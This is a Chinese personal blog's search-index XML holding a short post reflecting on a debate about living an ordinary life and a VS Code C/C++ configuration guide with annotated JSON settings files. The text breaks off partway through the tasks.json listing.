<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>围观辩论比赛</title>
    <link href="/dong.github/2024/09/21/D-talkcom/"/>
    <url>/dong.github/2024/09/21/D-talkcom/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>终其一生只是个平凡的人，你后悔&#x2F;不后悔？</strong></p><span id="more"></span><p><img src="/dong.github/images/0922.jpg"><br>非常精彩的一次辩论比赛围观。<br>终其一生只是个平凡的人，你后悔吗？<br>什么是平凡，而后悔又是什么？<br>这令我想到了这个：<br><strong>“不经过战斗的舍弃是虚伪的，不经劫难磨炼的超脱是轻佻的，逃避现实的明哲是卑怯的。”</strong><br>这个辩题展开内容还是非常丰富的。<br>最后几位评审的总结真是太好了，下面是视频实录。<br><a href="http://www.donghaixuan.com/2024/09/21/D-talkcom/">跳转主站</a><br><video src="/2024/09/21/D-talkcom/D-talk-0.mp4" position="absolute" width="100%" height="100%" controls="controls"></video><br><video src="/2024/09/21/D-talkcom/D-talk-1.mp4" position="absolute" width="100%" height="100%" controls="controls"></video></p><!-- <div style="position: relative; width: 100%; height: 100%; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=201033992&bvid=BV1dz411i75o&cid=203132924&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe></div> --><p>后悔是一种态度，而不后悔是一种判断。什么时候看山是山。<br>-欲买桂花同载酒，终不似，少年游。</p>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vscode C/C++编程指南</title>
    <link href="/dong.github/2024/09/20/Vscodesolutions/"/>
    <url>/dong.github/2024/09/20/Vscodesolutions/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>优雅地使用Vscode进行C&#x2F;C++编程指南,存储配置文件</strong></p><span id="more"></span><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍:"></a>介绍:</h1><p>使用前请根据配置文件下载并将编译器mingw放在合适位置，根据配置文件进行修改和调整。<br>以下配置项目可供C&#x2F;C++单文件程序日常使用。</p><div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/dong.github/images/0920-1.png" alt="配置所需插件"></div><div class="group-image-wrap"><img src="/dong.github/images/0920-2.png" alt="配置目录结构"></div></div></div><h1 id="配置文件-vscodecpp"><a href="#配置文件-vscodecpp" class="headerlink" title="配置文件(vscodecpp):"></a>配置文件(vscodecpp):</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>c_cpp_properties.json      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;win&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;includePath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;D:/programs/mingw/include&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;defines&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;compilerPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/programs/mingw/bin/g++.exe&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;cStandard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c11&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;cppStandard&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;c++11&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;intelliSenseMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;clang-x64&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">        <div class="fold-arrow">▶</div>launch.json      </div>      <div class="fold-collapse collapse" id="collapse-dcdac752">        <div class="fold-content">          <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">// https://github.com/Microsoft/vscode-cpptools/blob/master/launch.md</span><br><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;(gdb) Launch&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 配置名称，将会在启动配置的下拉菜单中显示</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cppdbg&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 配置类型，cppdbg对应cpptools提供的调试功能；可以认为此处只能是cppdbg</span><br>            <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 请求配置类型，可以为launch（启动）或attach（附加）</span><br>            <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 将要进行调试的程序的路径</span><br>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 程序调试时传递给程序的命令行参数，一般设为空即可</span><br>            <span class="hljs-attr">&quot;stopAtEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 设为true时程序将暂停在程序入口处，相当于在main上打断点</span><br>            <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 调试程序时的工作目录，此为工作区文件夹；改成$&#123;fileDirname&#125;可变为文件所在目录</span><br>            <span class="hljs-attr">&quot;environment&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 环境变量</span><br>            <span class="hljs-attr">&quot;externalConsole&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 为true时使用单独的cmd窗口，与其它IDE一致；18年10月后设为false可调用VSC内置终端</span><br>            <span class="hljs-attr">&quot;internalConsoleOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;neverOpen&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 如果不设为neverOpen，调试时会跳到“调试控制台”选项卡，你应该不需要对gdb手动输命令吧？</span><br>            <span class="hljs-attr">&quot;MIMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gdb&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 指定连接的调试器，可以为gdb或lldb。但我没试过lldb</span><br>            <span class="hljs-attr">&quot;miDebuggerPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gdb.exe&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 调试器路径，Windows下后缀不能省略，Linux下则不要</span><br>            <span class="hljs-attr">&quot;setupCommands&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// 模板自带，好像可以更好地显示STL容器的内容，具体作用自行Google</span><br>                    <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Enable pretty-printing for gdb&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;text&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;-enable-pretty-printing&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;ignoreFailures&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;preLaunchTask&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Compile&quot;</span> <span class="hljs-comment">// 调试会话开始前执行的任务，一般为编译程序。与tasks.json的label相对应</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">        <div class="fold-arrow">▶</div>settings.json      </div>      <div class="fold-collapse collapse" id="collapse-6ae3e036">        <div class="fold-content">          <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;files.defaultLanguage&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// ctrl+N新建文件后默认的语言</span><br>  <span class="hljs-attr">&quot;editor.formatOnType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 输入分号(C/C++的语句结束标识)后自动格式化当前这一行的代码</span><br>  <span class="hljs-attr">&quot;files.autoSave&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;onFocusChange&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;editor.formatOnSave&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;editor.formatOnPaste&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;editor.acceptSuggestionOnEnter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 我个人的习惯，按回车时一定是真正的换行，只有tab才会接受Intellisense</span><br>  <span class="hljs-attr">&quot;editor.minimap.enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;C_Cpp.autocomplete&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;default&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;[cpp]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;editor.quickSuggestions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;comments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;strings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;other&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;editor.wordBasedSuggestions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;matchingDocuments&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;editor.formatOnType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;[c]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;editor.quickSuggestions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;comments&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;strings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;other&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;on&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;editor.wordBasedSuggestions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;matchingDocuments&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;editor.formatOnType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;code-runner.runInTerminal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 设置成false会在“输出”中输出，无法输入</span><br>  <span class="hljs-attr">&quot;code-runner.executorMap&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-comment">//&quot;c&quot;: &quot;cd $dir &amp;&amp; gcc $fileName -o $fileNameWithoutExt.exe -Wall -g -O2 -static-libgcc  -fexec-charset=GBK &amp;&amp; $dir$fileNameWithoutExt&quot;,</span><br>    <span class="hljs-comment">//&quot;cpp&quot;: &quot;cd $dir &amp;&amp; g++ $fileName -o $fileNameWithoutExt.exe -Wall -g -O2 -static-libgcc  -fexec-charset=UTF-8 &amp;&amp; $dir$fileNameWithoutExt&quot;</span><br>    <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cd $dir &amp;&amp; gcc $fileName -o $fileNameWithoutExt.exe -Wall -g -O2 -static-libgcc -std=c17 -fexec-charset=UTF-8 &amp;&amp; $dir$fileNameWithoutExt&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cpp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;clear &amp;&amp; cd $dir &amp;&amp; g++ $fileName -o $fileNameWithoutExt.exe -Wall -g -O2 -static-libgcc -fexec-charset=GBK -std=c++17  &amp;&amp; $dir$fileNameWithoutExt&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 右键run code时运行的命令；未注释的仅适用于PowerShell（Win10默认），文件名中有空格也可以编译运行；注释掉的适用于cmd（win7默认），PS和bash也能用，但文件名中有空格时无法运行</span><br>  <span class="hljs-attr">&quot;code-runner.saveFileBeforeRun&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// run code前保存</span><br>  <span class="hljs-attr">&quot;code-runner.preserveFocus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 若为false，run code后光标会聚焦到终端上。如果需要频繁输入数据可设为false</span><br>  <span class="hljs-attr">&quot;code-runner.clearPreviousOutput&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 每次run code前清空属于code runner的终端消息，默认false</span><br>  <span class="hljs-attr">&quot;code-runner.ignoreSelection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 默认为false，效果是鼠标选中一块代码后可以单独执行，但C是编译型语言，不适合这样用</span><br>  <span class="hljs-attr">&quot;C_Cpp.clang_format_sortIncludes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;files.associations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;array&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;atomic&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;*.tcc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cctype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;clocale&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cmath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstdarg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstddef&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstdint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstdio&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstdlib&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cwchar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cwctype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;deque&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;unordered_map&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;exception&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;algorithm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;memory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;memory_resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;optional&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;string_view&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;system_error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tuple&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;type_traits&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;utility&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;fstream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;initializer_list&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;iosfwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;iostream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;istream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;limits&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ostream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;sstream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;stdexcept&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;streambuf&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typeinfo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 格式化时调整include的顺序（按字母排序）</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>tasks.json      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2.0.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span 